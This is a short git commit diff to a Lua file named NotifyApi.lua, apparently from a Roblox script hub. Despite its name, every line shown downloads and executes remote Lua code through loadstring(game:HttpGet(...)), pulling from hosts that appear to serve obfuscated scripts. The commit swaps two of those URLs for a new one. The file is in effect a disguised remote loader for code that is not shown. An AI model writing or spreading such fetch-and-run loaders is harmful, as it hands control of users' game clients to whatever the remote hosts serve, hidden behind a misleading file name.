ade24d47cd2c5d5b05474c9a77aaa9f94a05786a
Nova X Hub <thunganyeudau1111@gmail.com>
2026-07-16 16:49:32 +0700

    Update NotifyApi.lua

--- NotifyApi.lua
+++ NotifyApi.lua
@@ -1,6 +1,6 @@
 -- Web NQP
-loadstring(game:HttpGet("https://obfuscatorhub.onrender.com/api/znpis2ub"))()
+loadstring(game:HttpGet("https://xhider.xyz/raw/Xhider/Bot2/qacvhy2kru.txt"))()
 -- web trieu
-loadstring(game:HttpGet("https://xhider.xyz/raw/Xhider/Bot2/k7ca8e50f7.lua"))()
+loadstring(game:HttpGet("https://xhider.xyz/raw/Xhider/Bot2/qacvhy2kru.txt"))()
 -- exe total
 loadstring(game:HttpGet("https://shopaccnqp.onrender.com/api/upload/cnpnqrnt/raw"))()
